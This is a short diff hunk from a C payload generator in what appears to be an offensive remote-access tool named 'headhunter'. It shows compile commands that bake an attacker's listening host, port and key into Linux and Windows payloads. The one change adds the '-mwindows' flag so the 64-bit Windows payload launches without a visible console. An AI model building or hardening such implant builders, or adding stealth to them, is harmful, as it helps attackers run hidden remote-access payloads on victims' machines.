@@ -130,7 +130,7 @@ int generate_payload(char* platform, char* outfile, char* port, char* lhost, cha
 		snprintf(cmd, CMD_SIZE, "gcc /usr/lib/headhunter/payload/linux.c -fPIC -D PORT=%s -D LHOST='\"%s\"' -D KEY='\"%s\"' -o %s", port, lhost, key, outfile);
 	else if(strcmp(platform, "windows") == 0)
 		// x86_64-w64-mingw32-gcc payload_win.c -D PORT=port -D LHOST='"lhost"' -o outfile -lws2_32
-		snprintf(cmd, CMD_SIZE, "x86_64-w64-mingw32-gcc /usr/lib/headhunter/payload/windows.c -fPIC -D PORT=%s -D LHOST='\"%s\"' -D KEY='\"%s\"' -o %s -lws2_32", port, lhost, key, outfile);
+		snprintf(cmd, CMD_SIZE, "x86_64-w64-mingw32-gcc /usr/lib/headhunter/payload/windows.c -fPIC -D PORT=%s -D LHOST='\"%s\"' -D KEY='\"%s\"' -o %s -lws2_32 -mwindows", port, lhost, key, outfile);
 	else if(strcmp(platform, "win32") == 0)
 		// i686-w64-mingw32-gcc payload_win.c -D PORT=port -D LHOST='"lhost"' -o outfile -lws2_32
 		snprintf(cmd, CMD_SIZE, "i686-w64-mingw32-gcc /usr/lib/headhunter/payload/windows.c -fPIC -D PORT=%s -D LHOST='\"%s\"' -D KEY='\"%s\"' -o %s -lws2_32 -mwindows", port, lhost, key, outfile);
